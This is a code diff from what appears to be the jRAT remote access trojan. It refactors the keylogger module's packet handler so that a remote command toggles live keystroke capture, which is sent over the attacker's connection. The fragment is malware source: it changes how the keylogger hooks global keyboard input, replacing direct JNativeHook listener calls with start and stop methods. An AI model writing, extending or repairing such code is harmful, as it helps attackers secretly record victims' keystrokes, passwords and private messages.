@@ -3,7 +3,6 @@ package jrat.module.keys.packets;
 import jrat.client.Connection;
 import jrat.client.packets.incoming.IncomingPacket;
 import jrat.module.keys.Keylogger;
-import org.jnativehook.GlobalScreen;
 
 public class PacketToggleLive implements IncomingPacket {
 
@@ -12,10 +11,9 @@ public class PacketToggleLive implements IncomingPacket {
 
         if (enabled) {
             Keylogger keylogger = new Keylogger(con);
-            Keylogger.instance = keylogger;
-            GlobalScreen.addNativeKeyListener(keylogger);
+            keylogger.start();
         } else if (Keylogger.instance != null) {
-            GlobalScreen.removeNativeKeyListener(Keylogger.instance);
+            Keylogger.instance.stop();
         }
     }
 }
